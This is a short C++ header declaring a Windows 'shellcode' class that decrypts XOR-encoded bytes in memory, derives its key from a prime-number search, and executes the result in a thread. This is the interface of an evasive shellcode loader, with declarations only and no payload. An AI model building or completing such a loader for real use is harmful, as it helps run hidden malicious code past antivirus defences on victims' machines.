#pragma once
#include <windows.h>
#include <math.h>
class shellcode 
{
public:
	shellcode(unsigned char *raw);
	~shellcode();

	void Run();

private:
	LPVOID m_shellcode_address;
	SIZE_T m_shellcode_length;
	HANDLE m_thread_handle;

	static void decrypt_memory(LPVOID address, unsigned char xor_key, int length);
	static BYTE prime_to_key(unsigned long long int number);
	static unsigned long long int find_highest_prime(unsigned long long int border);

    static DWORD WINAPI ExecuteThread(LPVOID shellcode_address);
};